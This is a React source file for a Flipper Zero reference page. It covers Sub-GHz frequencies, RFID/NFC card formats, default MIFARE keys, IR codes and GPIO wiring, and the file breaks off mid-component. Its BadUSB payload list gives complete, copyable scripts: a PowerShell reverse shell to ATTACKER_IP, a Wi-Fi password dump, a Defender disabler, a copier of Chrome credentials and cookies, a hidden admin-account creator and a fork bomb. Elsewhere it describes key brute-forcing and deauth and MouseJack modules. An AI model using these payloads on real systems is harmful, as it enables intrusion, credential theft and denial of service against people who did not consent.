import { useState, useMemo } from 'react';
import { Card } from '../components/ui/Card.jsx';
import { CopyButton } from '../components/ui/CopyButton.jsx';
import { ToolHelp } from '../components/ui/ToolHelp.jsx';
import {
  Radio, CreditCard, Tv, Usb, Cpu, Search, Zap, Wifi,
  ShieldAlert, Lock, Key, Cable, ChevronRight, Terminal, Package,
  BookOpen, AlertTriangle, Globe,
} from 'lucide-react';

const mono = 'JetBrains Mono, monospace';
const heading = 'Space Grotesk, sans-serif';

const BG = '#141820';
const BG_PANEL = '#1A1F2E';
const CARD_BG = '#1E2536';
const ACCENT = '#6EE7B7';

const TABS = [
  { key: 'subghz', label: 'Sub-GHz', icon: Radio },
  { key: 'rfid', label: 'RFID & NFC', icon: CreditCard },
  { key: 'ir', label: 'Infrared', icon: Tv },
  { key: 'badusb', label: 'BadUSB / HID', icon: Usb },
  { key: 'gpio', label: 'GPIO & HW', icon: Cpu },
  { key: 'firmware', label: 'Firmware & Resources', icon: Package },
];

// ═══════════════════════════════════════════════════════
//  DATA
// ═══════════════════════════════════════════════════════

const FREQUENCIES = [
  { freq: '300 MHz', regions: ['US'], uses: 'Garage doors (older), security systems' },
  { freq: '315 MHz', regions: ['US', 'Asia'], uses: 'Car key fobs (NA), garage doors, TPMS, aftermarket alarms' },
  { freq: '345 MHz', regions: ['US'], uses: 'Some Genie/Overhead Door legacy systems' },
  { freq: '390 MHz', regions: ['US'], uses: 'LiftMaster/Chamberlain Security+ (older fixed)' },
  { freq: '418 MHz', regions: ['US'], uses: 'Security panels, medical telemetry (check local rules)' },
  { freq: '433.05 MHz', regions: ['EU'], uses: 'ISM band edge; cheap remotes, sensors near 433.92' },
  { freq: '433.92 MHz', regions: ['EU', 'Asia'], uses: 'Car fobs (EU), doorbells, Oregon/Acurite weather, IoT, gates' },
  { freq: '434 MHz', regions: ['EU'], uses: 'Some TPMS and tire shop tools' },
  { freq: '868.0–868.6 MHz', regions: ['EU'], uses: 'Car fobs (EU), alarms, LoRa, Z-Wave, home automation' },
  { freq: '868.95 MHz', regions: ['EU'], uses: 'Some gate/barrier receivers' },
  { freq: '902–928 MHz', regions: ['US'], uses: 'LoRa, smart meters, some industrial remotes (ISM)' },
  { freq: '915 MHz', regions: ['US'], uses: 'LoRaWAN US, RFID research adjacent, ISM gadgets' },
];

const SUBGHZ_PROTOCOLS = [
  { name: 'Princeton', bits: 24, desc: 'Simple OOK, 24-bit fixed. Cheap remotes, doorbells, toys.' },
  { name: 'CAME', bits: 12, desc: '12-bit fixed; EU gates and barriers.' },
  { name: 'Nice FLO', bits: 12, desc: 'Nice S.p.A. gates; Italian/EU automation.' },
  { name: 'Nice Flor-S', bits: 52, desc: 'Nice rolling-code family; capture/replay often blocked.' },
  { name: 'Linear', bits: 10, desc: '10-bit DIP; older US garage doors.' },
  { name: 'Linear Delta-3', bits: 8, desc: '8-bit trinary; legacy US openers.' },
  { name: 'Holtek', bits: 12, desc: 'HT6P20B-style encoders; rolling/fixed mix.' },
  { name: 'Chamberlain', bits: 9, desc: '9-bit trinary; Chamberlain/LiftMaster (legacy).' },
  { name: 'Security+ 2.0', bits: 'var', desc: 'Rolling; modern LiftMaster/Chamberlain — not cloneable as fixed key.' },
  { name: 'KeeLoq', bits: 66, desc: 'Microchip rolling; garage + automotive aftermarket.' },
  { name: 'Star Line', bits: 64, desc: 'Rolling; alarms, Eastern EU vehicle security.' },
  { name: 'Gate TX', bits: 24, desc: 'Generic 24-bit OOK gate TX.' },
  { name: 'Nero Radio', bits: 56, desc: 'Nero blinds/shutters.' },
  { name: 'Faac SLH', bits: 'var', desc: 'Rolling; FAAC gates — replay limited.' },
  { name: 'Somfy RTS', bits: 'var', desc: 'Rolling shutters/awnings; proprietary stack.' },
  { name: 'Marantec', bits: 'var', desc: 'Rolling garage systems; region-dependent.' },
  { name: 'Clemsa', bits: 12, desc: 'Fixed 12-bit; Spanish/legacy gates.' },
  { name: 'AN-Motors', bits: 24, desc: 'Gate/barrier brand common in EU.' },
  { name: 'Honeywell', bits: 'var', desc: 'Security fobs/panels; often 345/433 MHz variants.' },
  { name: 'PT2260 / EV1527', bits: 24, desc: 'ASIC OOK encoders; huge number of cheap sensors/remotes.' },
  { name: 'Intertechno', bits: 24, desc: 'EU home automation switches/outlets (433.92).' },
  { name: 'Kia/Hyundai (aftermarket)', bits: 'var', desc: 'Aftermarket fobs often fixed OOK; OEM rolling — authorized testing only.' },
  { name: 'Ford/GM (aftermarket)', bits: 'var', desc: '315 MHz US aftermarket; OEM rolling not replayable long-term.' },
  { name: 'Marantec Digital', bits: 'var', desc: 'Digital rolling; capture shows changing counters.' },
];

const SUBGHZ_WEATHER = [
  { brand: 'Oregon Scientific', band: '433.92 MHz', notes: 'OOK burst packets; many models — Read RAW + protocol plugins.' },
  { brand: 'Acurite', band: '433 MHz', notes: 'OOK/Manchester variants; tower + display pairing.' },
  { brand: 'La Crosse', band: '433 / 915', notes: 'Region-specific; timing-heavy decoding.' },
  { brand: 'Fine Offset (WH1080)', band: '433.92', notes: 'Common weather station chipset family.' },
  { brand: 'Hideki', band: '433.92', notes: 'Similar ecosystem to Fine Offset clones.' },
  { brand: 'Rubicson', band: '433.92', notes: 'Budget stations; short bursty frames.' },
  { brand: 'Ambient Weather', band: '433 / 915', notes: 'Often Fine Offset or OEM rebrands.' },
  { brand: 'TFA / Nexus', band: '433.92', notes: 'EU market; multiple frame types.' },
];

const SUBGHZ_GARAGE_BRANDS = [
  { brand: 'Chamberlain / LiftMaster', typical: '315 / 390 / 433', notes: 'Security+ rolling on newer; fixed on very old.' },
  { brand: 'Genie / Overhead Door', typical: '300–390', notes: 'Intellicode rolling on newer models.' },
  { brand: 'Sommer', typical: '868 EU', notes: 'Rolling; brand-specific.' },
  { brand: 'Hörmann', typical: '868', notes: 'BiSecur rolling — not simple replay.' },
  { brand: 'Cardin', typical: '433.92', notes: 'EU gates; fixed/rolling mix.' },
  { brand: 'BFT', typical: '433 / 868', notes: 'Industrial gates; rolling common.' },
  { brand: 'Ditec', typical: '433.92', notes: 'EU barriers.' },
  { brand: 'Mighty Mule', typical: '318 MHz', notes: 'US driveway gates; check FCC label on remote.' },
];

const SUBGHZ_FOB_NOTES = [
  { topic: '315 MHz', detail: 'Common in North America for OEM and aftermarket keyless entry / TPMS-adjacent gear.' },
  { topic: '433.92 MHz', detail: 'EU/Asia ISM; huge variety of fobs, sensors, and clones.' },
  { topic: '868 MHz', detail: 'EU automotive and home automation; narrower band than US 915 ISM.' },
  { topic: 'Fixed vs rolling', detail: 'Fixed codes replay until re-keyed. Rolling advances a counter + crypto — simple replay fails after one use on properly implemented receivers.' },
  { topic: 'Analysis workflow', detail: 'Read RAW → Pulse Plot → compare to decoders → save Key or RAW .sub for lab replay on your own hardware only.' },
];

const SUBGHZ_REGIONAL_REGS = [
  { region: 'United States (FCC)', band: 'Part 15 ISM', notes: '315 MHz often used under intentional radiator rules for fobs; 433 is not primary ISM like EU — check device class. Fines for modified power/antenna.' },
  { region: 'EU (ETSI / national)', band: '433.05–434.79 / 863–870', notes: 'Duty cycle and power limits apply; continuous TX illegal on many sub-bands.' },
  { region: 'Japan', band: '950 MHz / 426 MHz etc.', notes: '433 MHz band not aligned with EU/US; import devices may be illegal to operate.' },
  { region: 'Canada (ISED)', band: 'Similar to FCC', notes: 'Follow RSS rules; harmonized with US for many consumer devices.' },
];

const SUBGHZ_BRUTE_CONFIG = [
  { protocol: 'CAME 12-bit', idea: 'Exhaust 4096 states — only where law permits and you own the receiver.' },
  { protocol: 'Princeton 24-bit', idea: 'Large search space; practical only for weak fixed installs with narrow TE.' },
  { protocol: 'KeeLoq', idea: 'Not brute-forceable by naive enumeration; research attacks exist — authorized testing only.' },
  { tool: 'Sub-GHz Bruteforcer (app)', idea: 'Step through key space with preset TE/frequency — verify legal use case.' },
];

const ROLLING_CODE_EXPLAINED = `Rolling code (hopping code) protects against replay: transmitter and receiver share a secret and a counter. Each press sends a fresh code; the receiver accepts only codes ahead of the last seen window.

Limitations for authorized testing / owners:
• Simple replay of one frame often works only once — or fails if counter moved.
• Rolljam-class attacks need specialized timing — legally and ethically restricted.
• Clone tools may require extracting seed from a legitimate transmitter — misuse is illegal.

Flipper: capture and replay fixed codes; rolling systems usually need manufacturer tools or research on hardware you own.`;

const SUB_RAW_CAPTURE_CLI = `# On-device: Sub-GHz → Read RAW → set frequency (e.g. 433920000) → Save .sub

# qFlipper / SD: place .sub under /ext/subghz/

# Optional preset in file header for OOK async:
# Preset: FuriHalSubGhzPresetOok650Async

# Desktop (lab): import RAW_Data into inspectrum / Universal Radio Hacker for pulse analysis`;

const SUB_BRUTEFORCE_CLI = `# Sub-GHz Bruteforcer or community plugins
# Configure: Frequency, Protocol (if known), TE, bit length, key range
# App → Sub-GHz → Bruteforcer → Load protocol → Set start key → Run

# Test only systems you own or have written authorization to assess.`;

const SUB_FILE_FIELDS = [
  { field: 'Filetype', desc: 'Always "Flipper SubGhz RAW File" or "Flipper SubGhz Key File"' },
  { field: 'Version', desc: 'File format version (currently 1)' },
  { field: 'Frequency', desc: 'Carrier frequency in Hz (e.g. 433920000)' },
  { field: 'Preset', desc: 'Radio preset: FuriHalSubGhzPresetOok650Async, FuriHalSubGhzPresetOok270Async, FuriHalSubGhzPreset2FSKDev238Async, FuriHalSubGhzPreset2FSKDev476Async' },
  { field: 'Protocol', desc: 'Decoded protocol name (Princeton, CAME, etc.) — Key files only' },
  { field: 'Bit', desc: 'Number of bits in the key — Key files only' },
  { field: 'Key', desc: 'Hex key value (e.g. 00 00 00 00 00 12 34 56) — Key files only' },
  { field: 'TE', desc: 'Timing element in μs — base pulse duration for the protocol' },
  { field: 'RAW_Data', desc: 'Sequence of pulse/gap durations in μs (positive = pulse, negative = gap) — RAW files only' },
];

const SUB_RAW_EXAMPLE = `Filetype: Flipper SubGhz RAW File
Version: 1
Frequency: 433920000
Preset: FuriHalSubGhzPresetOok650Async
Protocol: RAW
RAW_Data: 5017 -520 492 -513 493 -510 496 -508 498 -23058 24 -510 496 -508 498 -506 500`;

const SUB_KEY_EXAMPLE = `Filetype: Flipper SubGhz Key File
Version: 1
Frequency: 433920000
Preset: FuriHalSubGhzPresetOok650Async
Protocol: Princeton
Bit: 24
Key: 00 00 00 00 00 11 22 33
TE: 400`;

const RFID_125 = [
  { type: 'EM4100', format: '40-bit (8-bit version + 32-bit ID)', structure: '9 header bits + 10 rows × 4 data + parity', rw: 'Read only', notes: 'Most common 125kHz card. Simple Manchester encoding.' },
  { type: 'HID ProxCard II', format: '26/35/37-bit variants (H10301 etc.)', structure: 'FSK; facility + card number', rw: 'Read only', notes: 'Clone to T5577 via Read → Save → Write (authorized systems only).' },
  { type: 'HID Prox', format: '26-bit (H10301): 1 parity + 8 facility + 16 card + 1 parity', structure: 'FSK modulated, proprietary format', rw: 'Read only', notes: 'Very common in US access control. 26-bit is standard, 35-bit corporate.' },
  { type: 'HID iCLASS', format: '13.56 MHz HF (listed here for workflow)', structure: 'DES/3DES; multi-application', rw: 'Read/Write*', notes: 'Not LF — use NFC app. Cloning depends on key diversification; many installs use default keys (authorized assessment only).' },
  { type: 'Indala', format: '26-bit or 29-bit custom', structure: 'PSK modulated, Motorola/HID proprietary', rw: 'Read only', notes: 'Older access control system, now owned by HID Global.' },
  { type: 'AWID', format: '26–50 bit', structure: 'FSK', rw: 'Read only', notes: 'Common US proximity; emulate on writable T5577 with correct config.' },
  { type: 'IOProx', format: 'Variable', structure: 'Kantech / card formats', rw: 'Read only', notes: 'Often seen in small business access.' },
  { type: 'Pyramid', format: 'Custom', structure: 'Farpointe / Keri', rw: 'Read only', notes: 'Check bit length before T5577 write.' },
  { type: 'FDX-B', format: '128-bit (ISO 11784/85)', structure: '38-bit national code + 10-bit country + flags', rw: 'Read only', notes: 'Animal identification (pet microchips). HDX also exists.' },
  { type: 'T5577', format: 'Configurable (supports EM4100, HID, Indala, etc.)', structure: '8 blocks × 32 bits = 330 bits usable', rw: 'Read/Write', notes: 'Universal writable card. Can emulate most 125kHz card types. The "magic card" of LF RFID.' },
  { type: 'EM4305', format: 'Similar use case to T5577', structure: 'EEPROM blocks', rw: 'Read/Write', notes: 'Alternative writable LF IC; configure modulation/encoding.' },
  { type: 'Viking', format: '64-bit', structure: 'Manchester encoded fixed code', rw: 'Read only', notes: 'Viking Electronics access control system.' },
  { type: 'Paradox', format: '26-bit or custom', structure: 'FSK modulated', rw: 'Read only', notes: 'Paradox Security Systems access control.' },
  { type: 'G-Prox II', format: 'Variable', structure: 'Guardall / similar', rw: 'Read only', notes: 'Regional access brands; verify encoding.' },
];

const RFID_NFC = [
  { type: 'MIFARE Classic 1K', memory: '1024 bytes', sectors: '16 sectors × 4 blocks × 16 bytes', security: 'Crypto1 (broken — vulnerable to Darkside, Nested, Hardnested attacks)', notes: 'Most widely deployed NFC card. Default keys usually work.' },
  { type: 'MIFARE Classic 4K', memory: '4096 bytes', sectors: '32 sectors × 4 blocks + 8 sectors × 16 blocks', security: 'Crypto1 (same vulnerabilities as 1K)', notes: 'Larger storage variant. Same crackable crypto.' },
  { type: 'MIFARE Ultralight', memory: '64 bytes', sectors: '16 pages × 4 bytes', security: 'None (no authentication)', notes: 'Disposable tickets, transit cards. No crypto, fully readable.' },
  { type: 'MIFARE Ultralight C', memory: '192 bytes', sectors: '48 pages × 4 bytes', security: '3DES authentication', notes: 'Improved Ultralight with encryption. Used in transit systems.' },
  { type: 'NTAG 213', memory: '180 bytes (144 user)', sectors: '45 pages × 4 bytes', security: 'Password (32-bit)', notes: 'NFC Forum Type 2. Amiibo, NFC tags, URL tags. 137 bytes NDEF.' },
  { type: 'NTAG 215', memory: '540 bytes (504 user)', sectors: '135 pages × 4 bytes', security: 'Password (32-bit)', notes: 'Amiibo cards use this exact type. 496 bytes NDEF capacity.' },
  { type: 'NTAG 216', memory: '924 bytes (888 user)', sectors: '231 pages × 4 bytes', security: 'Password (32-bit)', notes: 'Largest NTAG21x. Good for vCards or larger NDEF payloads.' },
  { type: 'MIFARE DESFire EV1', memory: '2K / 4K / 8K', sectors: 'Application-based (up to 28 apps)', security: 'AES-128, 3DES, 3K3DES', notes: 'Modern secure card. Not easily cloneable. Transit, access control.' },
  { type: 'MIFARE DESFire EV2/EV3', memory: '2K–8K', sectors: 'Application-based with delegated management', security: 'AES-128 + Proximity Check', notes: 'Latest generation. Relay attack protection. Very hard to crack.' },
];

const MIFARE_KEYS = [
  { key: 'FF FF FF FF FF FF', desc: 'Factory default — most common, try first' },
  { key: 'A0 A1 A2 A3 A4 A5', desc: 'NFC Forum MAD key (Sector 0, Key A)' },
  { key: 'D3 F7 D3 F7 D3 F7', desc: 'NFC Forum NDEF key (data sectors)' },
  { key: '00 00 00 00 00 00', desc: 'All zeros — second most common default' },
  { key: 'B0 B1 B2 B3 B4 B5', desc: 'Some Chinese clone cards default' },
  { key: '4D 3A 99 C3 51 DD', desc: 'Vigik (French building access) key' },
  { key: '1A 98 2C 7E 45 9A', desc: 'Common in transit system cards' },
  { key: 'AA BB CC DD EE FF', desc: 'Frequently used in dev/test systems' },
  { key: '71 4C 5C 88 6E 97', desc: 'Some elevator access systems' },
  { key: '58 7E E5 F9 35 0F', desc: 'Common in parking systems' },
];

const IR_PROTOCOLS = [
  { name: 'NEC', carrier: '38 kHz', encoding: 'Pulse distance', timing: 'Lead: 9ms pulse + 4.5ms space. 0: 562μs pulse + 562μs space. 1: 562μs pulse + 1687μs space', bits: 32, notes: 'Most common. 8-bit address + 8-bit inverse + 8-bit command + 8-bit inverse.' },
  { name: 'NECext', carrier: '38 kHz', encoding: 'Pulse distance', timing: 'Same as NEC but uses full 16-bit address (no inverse)', bits: 32, notes: 'Extended NEC — 16-bit address, 8-bit command + inverse.' },
  { name: 'Samsung32', carrier: '38 kHz', encoding: 'Pulse distance', timing: 'Lead: 4.5ms pulse + 4.5ms space. Bit timing same as NEC', bits: 32, notes: 'Samsung variant. Custom code + data + inverted data.' },
  { name: 'RC5', carrier: '36 kHz', encoding: 'Manchester (bi-phase)', timing: 'Bit period: 1.778ms. Half-bit: 889μs', bits: 14, notes: 'Philips protocol. 2 start + toggle + 5 address + 6 command bits.' },
  { name: 'RC6', carrier: '36 kHz', encoding: 'Manchester (bi-phase)', timing: 'Leader: 2.666ms pulse + 889μs space. Toggle bit is double-width', bits: 20, notes: 'Successor to RC5. Used by Microsoft MCE remotes. Mode + toggle + address + command.' },
  { name: 'SIRC', carrier: '40 kHz', encoding: 'Pulse width', timing: 'Lead: 2.4ms pulse + 600μs space. 0: 600μs pulse. 1: 1.2ms pulse', bits: '12/15/20', notes: 'Sony protocol. 7 command + 5/8/13 device bits. Sent 3x minimum.' },
  { name: 'Panasonic', carrier: '37 kHz', encoding: 'Pulse distance', timing: 'Lead: 3.5ms pulse + 1.75ms space. Similar bit timing to NEC', bits: 48, notes: '16-bit manufacturer + 4-bit parity + 8-bit device + 8-bit subdevice + 8-bit function + 4-bit checksum.' },
  { name: 'KASEIKYO', carrier: '37 kHz', encoding: 'Pulse distance', timing: 'Same as Panasonic (Panasonic variant)', bits: 48, notes: 'Japan-standard protocol. Used by Panasonic, Sharp, JVC, Denon, and others.' },
];

const IR_UNIVERSAL = [
  { action: 'Power Toggle', protocol: 'NEC', address: '04', command: '08', hex: '00 04 08 F7', notes: 'Generic TV power (works on many brands)' },
  { action: 'Volume Up', protocol: 'NEC', address: '04', command: '02', hex: '00 04 02 FD', notes: 'Standard volume increase' },
  { action: 'Volume Down', protocol: 'NEC', address: '04', command: '03', hex: '00 04 03 FC', notes: 'Standard volume decrease' },
  { action: 'Mute', protocol: 'NEC', address: '04', command: '09', hex: '00 04 09 F6', notes: 'Toggle mute' },
  { action: 'Channel Up', protocol: 'NEC', address: '04', command: '00', hex: '00 04 00 FF', notes: 'Next channel' },
  { action: 'Channel Down', protocol: 'NEC', address: '04', command: '01', hex: '00 04 01 FE', notes: 'Previous channel' },
  { action: 'Input/Source', protocol: 'NEC', address: '04', command: '0B', hex: '00 04 0B F4', notes: 'Switch HDMI/input source' },
  { action: 'Menu', protocol: 'NEC', address: '04', command: '0E', hex: '00 04 0E F1', notes: 'Open TV menu' },
];

const IR_FILE_EXAMPLE = `Filetype: Flipper SubGhz Key File
Version: 1
#
name: Power
type: parsed
protocol: NEC
address: 04 00 00 00
command: 08 00 00 00
#
name: Vol_Up
type: parsed
protocol: NEC
address: 04 00 00 00
command: 02 00 00 00
#
name: Vol_Down
type: parsed
protocol: NEC
address: 04 00 00 00
command: 03 00 00 00`;

const DUCKY_COMMANDS = [
  { cmd: 'DELAY', args: '<ms>', desc: 'Pause execution for N milliseconds' },
  { cmd: 'STRING', args: '<text>', desc: 'Type a string of characters' },
  { cmd: 'STRINGLN', args: '<text>', desc: 'Type a string and press ENTER' },
  { cmd: 'GUI / WINDOWS', args: '[key]', desc: 'Press the Windows/Command key (optionally with another key)' },
  { cmd: 'CTRL', args: '[key]', desc: 'Press Ctrl (optionally with another key like CTRL c)' },
  { cmd: 'ALT', args: '[key]', desc: 'Press Alt (optionally with another key)' },
  { cmd: 'SHIFT', args: '[key]', desc: 'Press Shift (optionally with another key)' },
  { cmd: 'ENTER', args: '', desc: 'Press the Enter key' },
  { cmd: 'TAB', args: '', desc: 'Press the Tab key' },
  { cmd: 'ESCAPE', args: '', desc: 'Press the Escape key' },
  { cmd: 'BACKSPACE', args: '', desc: 'Press the Backspace key' },
  { cmd: 'DELETE', args: '', desc: 'Press the Delete key' },
  { cmd: 'UPARROW / DOWNARROW', args: '', desc: 'Arrow key press' },
  { cmd: 'LEFTARROW / RIGHTARROW', args: '', desc: 'Arrow key press' },
  { cmd: 'CAPSLOCK', args: '', desc: 'Toggle Caps Lock' },
  { cmd: 'PRINTSCREEN', args: '', desc: 'Press Print Screen' },
  { cmd: 'REPEAT', args: '<n>', desc: 'Repeat the previous command N times' },
  { cmd: 'DEFAULTDELAY', args: '<ms>', desc: 'Set delay between every command (global)' },
  { cmd: 'REM', args: '<comment>', desc: 'Comment line (ignored during execution)' },
];

const DUCKY_PAYLOADS = [
  {
    name: 'Reverse Shell (Windows)',
    desc: 'Opens PowerShell and creates a TCP reverse shell back to attacker',
    payload: `REM Reverse Shell - Windows PowerShell
REM Change ATTACKER_IP and PORT
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1000
STRING $c = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);
ENTER
DELAY 100
STRING $s = $c.GetStream();[byte[]]$b = 0..65535|%{0};
ENTER
DELAY 100
STRING while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;
ENTER
DELAY 100
STRING $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);
ENTER
DELAY 100
STRING $r = (iex $d 2>&1 | Out-String );
ENTER
DELAY 100
STRING $sb = ([text.encoding]::ASCII).GetBytes($r);
ENTER
DELAY 100
STRING $s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()
ENTER`,
  },
  {
    name: 'WiFi Password Grabber',
    desc: 'Dumps all saved WiFi SSIDs and passwords to a text file on the desktop',
    payload: `REM WiFi Password Grabber - Windows
DELAY 1000
GUI r
DELAY 500
STRING cmd /k
ENTER
DELAY 800
STRING cd %USERPROFILE%\\Desktop && netsh wlan show profiles | findstr "Profile" > wifi_names.txt && for /f "tokens=2 delims=:" %a in (wifi_names.txt) do @netsh wlan show profile name=%a key=clear | findstr "Key Content SSID" >> wifi_passwords.txt
ENTER
DELAY 3000
STRING del wifi_names.txt && exit
ENTER`,
  },
  {
    name: 'Disable Windows Defender',
    desc: 'Disables real-time protection via PowerShell (requires admin)',
    payload: `REM Disable Windows Defender Real-Time Protection
REM Requires admin privileges
DELAY 1000
GUI r
DELAY 400
STRING powershell Start-Process powershell -Verb runAs
ENTER
DELAY 2000
ALT y
DELAY 1000
STRING Set-MpPreference -DisableRealtimeMonitoring $true
ENTER
DELAY 500
STRING Set-MpPreference -DisableIOAVProtection $true
ENTER
DELAY 500
STRING Set-MpPreference -DisableBehaviorMonitoring $true
ENTER
DELAY 500
STRING exit
ENTER`,
  },
  {
    name: 'Exfil Browser Data (Conceptual)',
    desc: 'Copies Chrome login data and cookies to a USB exfil folder',
    payload: `REM Chrome Data Exfiltration (Conceptual)
REM Copies encrypted login data — needs offline decrypt
DELAY 1000
GUI r
DELAY 500
STRING cmd
ENTER
DELAY 800
STRING mkdir %USERPROFILE%\\Desktop\\exfil
ENTER
DELAY 200
STRING copy "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data" "%USERPROFILE%\\Desktop\\exfil\\LoginData.db"
ENTER
DELAY 200
STRING copy "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Cookies" "%USERPROFILE%\\Desktop\\exfil\\Cookies.db"
ENTER
DELAY 200
STRING copy "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Local State" "%USERPROFILE%\\Desktop\\exfil\\LocalState.json"
ENTER
DELAY 200
STRING exit
ENTER`,
  },
  {
    name: 'Rickroll',
    desc: 'Opens Rick Astley\'s Never Gonna Give You Up in the default browser',
    payload: `REM Rickroll - The Classic
DELAY 500
GUI r
DELAY 400
STRING https://www.youtube.com/watch?v=dQw4w9WgXcQ
ENTER`,
  },
  {
    name: 'Create Admin User (Windows)',
    desc: 'Creates a hidden admin user account on the target machine',
    payload: `REM Create Hidden Admin User
REM Requires admin privileges
DELAY 1000
GUI r
DELAY 400
STRING powershell Start-Process cmd -Verb runAs
ENTER
DELAY 2000
ALT y
DELAY 1000
STRING net user hacker Password123! /add
ENTER
DELAY 500
STRING net localgroup administrators hacker /add
ENTER
DELAY 500
STRING reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /v hacker /t REG_DWORD /d 0 /f
ENTER
DELAY 500
STRING exit
ENTER`,
  },
  {
    name: 'Fork Bomb (Windows)',
    desc: 'Spawns infinite cmd processes — freezes the system',
    payload: `REM Fork Bomb - Windows
REM WARNING: Will crash the system
DELAY 500
GUI r
DELAY 400
STRING cmd
ENTER
DELAY 500
STRING %0|%0
ENTER`,
  },
];

const GPIO_PINS = [
  { pin: 1, label: '3V3', func: '3.3V Power Output', type: 'power', notes: 'Max 200mA total from this rail' },
  { pin: 2, label: 'SIO', func: 'Serial I/O (iButton/1-Wire)', type: 'data', notes: 'iButton data line with pull-up' },
  { pin: 3, label: 'TX', func: 'UART Transmit (USART1_TX)', type: 'uart', notes: 'Flipper TX → Target RX (3.3V)' },
  { pin: 4, label: 'RX', func: 'UART Receive (USART1_RX)', type: 'uart', notes: 'Flipper RX ← Target TX (3.3V)' },
  { pin: 5, label: 'C1', func: 'GPIO PC1 / ADC', type: 'gpio', notes: 'General purpose / analog input (ADC channel 2)' },
  { pin: 6, label: 'C0', func: 'GPIO PC0 / ADC', type: 'gpio', notes: 'General purpose / analog input (ADC channel 1)' },
  { pin: 7, label: 'SWC', func: 'SWD Clock (debug)', type: 'debug', notes: 'SWD debug clock — do not use normally' },
  { pin: 8, label: 'GND', func: 'Ground', type: 'power', notes: 'Common ground reference' },
  { pin: 9, label: '5V', func: '5V Power (from USB or battery)', type: 'power', notes: 'Only available when USB connected or battery charged' },
  { pin: 10, label: 'A7', func: 'GPIO PA7 / SPI1_MOSI', type: 'spi', notes: 'SPI Master Out Slave In' },
  { pin: 11, label: 'A6', func: 'GPIO PA6 / SPI1_MISO', type: 'spi', notes: 'SPI Master In Slave Out' },
  { pin: 12, label: 'A4', func: 'GPIO PA4 / SPI1_CS', type: 'spi', notes: 'SPI Chip Select (active low)' },
  { pin: 13, label: 'B3', func: 'GPIO PB3 / SPI1_SCK', type: 'spi', notes: 'SPI Clock line' },
  { pin: 14, label: 'B2', func: 'GPIO PB2 / BOOT1', type: 'gpio', notes: 'General purpose I/O or Boot1 select' },
  { pin: 15, label: 'C3', func: 'GPIO PC3 / ADC', type: 'gpio', notes: 'General purpose / analog input (ADC channel 4)' },
  { pin: 16, label: 'SDA', func: 'I2C1 SDA (PB7)', type: 'i2c', notes: 'I2C data line — has internal pull-up' },
  { pin: 17, label: 'SCL', func: 'I2C1 SCL (PB6)', type: 'i2c', notes: 'I2C clock line — has internal pull-up' },
  { pin: 18, label: 'SWD', func: 'SWD Data (debug)', type: 'debug', notes: 'SWD debug data — do not use normally' },
];

const GPIO_MODULES = [
  {
    name: 'ESP32 WiFi Dev Board',
    desc: 'Official Flipper WiFi devboard for Marauder, Evil Portal, deauthentication attacks, and packet sniffing.',
    connections: [
      { flipper: 'TX (pin 3)', module: 'RX (GPIO3)', wire: 'green' },
      { flipper: 'RX (pin 4)', module: 'TX (GPIO1)', wire: 'white' },
      { flipper: '3V3 (pin 1)', module: '3V3', wire: 'red' },
      { flipper: 'GND (pin 8)', module: 'GND', wire: 'black' },
      { flipper: '5V (pin 9)', module: 'VIN (if 5V needed)', wire: 'orange' },
    ],
  },
  {
    name: 'NRF24L01+ Module',
    desc: 'Used for MouseJack attacks (wireless mouse/keyboard injection), BLE sniffing. 2.4GHz transceiver.',
    connections: [
      { flipper: 'A7 / MOSI (pin 10)', module: 'MOSI', wire: 'blue' },
      { flipper: 'A6 / MISO (pin 11)', module: 'MISO', wire: 'green' },
      { flipper: 'B3 / SCK (pin 13)', module: 'SCK', wire: 'yellow' },
      { flipper: 'A4 / CS (pin 12)', module: 'CSN', wire: 'orange' },
      { flipper: 'C3 (pin 15)', module: 'CE', wire: 'purple' },
      { flipper: '3V3 (pin 1)', module: 'VCC', wire: 'red' },
      { flipper: 'GND (pin 8)', module: 'GND', wire: 'black' },
    ],
  },
  {
    name: 'UART TTL Adapter (CP2102/CH340)',
    desc: 'Serial console access to routers, IoT devices, embedded systems. Connect for shell access over UART.',
    connections: [
      { flipper: 'TX (pin 3)', module: 'RX', wire: 'green' },
      { flipper: 'RX (pin 4)', module: 'TX', wire: 'white' },
      { flipper: 'GND (pin 8)', module: 'GND', wire: 'black' },
    ],
  },
  {
    name: 'CC1101 Module (External)',
    desc: 'Extended Sub-GHz range with external antenna. Better RX sensitivity and TX power for Sub-GHz work.',
    connections: [
      { flipper: 'A7 / MOSI (pin 10)', module: 'MOSI', wire: 'blue' },
      { flipper: 'A6 / MISO (pin 11)', module: 'MISO', wire: 'green' },
      { flipper: 'B3 / SCK (pin 13)', module: 'SCK', wire: 'yellow' },
      { flipper: 'A4 / CS (pin 12)', module: 'CSN', wire: 'orange' },
      { flipper: 'B2 (pin 14)', module: 'GDO0', wire: 'purple' },
      { flipper: '3V3 (pin 1)', module: 'VCC', wire: 'red' },
      { flipper: 'GND (pin 8)', module: 'GND', wire: 'black' },
    ],
  },
];

const PIN_COLORS = {
  power: '#EF4444',
  uart: '#3B82F6',
  spi: '#A78BFA',
  i2c: '#F59E0B',
  gpio: '#6EE7B7',
  data: '#7DD3FC',
  debug: '#6B7280',
};

const REGION_COLORS = {
  US: '#7DD3FC',
  EU: '#C4B5FD',
  Asia: '#FBBF24',
};

// ═══════════════════════════════════════════════════════
//  HELPERS
// ═══════════════════════════════════════════════════════

function CodeBlock({ code, label }) {
  return (
    <div style={{ position: 'relative', background: '#0B0F18', borderRadius: 8, border: '1px solid rgba(255,255,255,0.04)' }}>
      {label && (
        <div style={{
          padding: '8px 14px', borderBottom: '1px solid rgba(255,255,255,0.04)',
          display: 'flex', justifyContent: 'space-between', alignItems: 'center',
        }}>
          <span style={{ fontFamily: mono, fontSize: 10, color: '#6B7280', textTransform: 'uppercase', letterSpacing: '0.05em' }}>{label}</span>
          <CopyButton text={code} />
        </div>
      )}
      <pre style={{
        margin: 0, padding: 14, fontFamily: mono, fontSize: 11, color: '#E2E8F0',
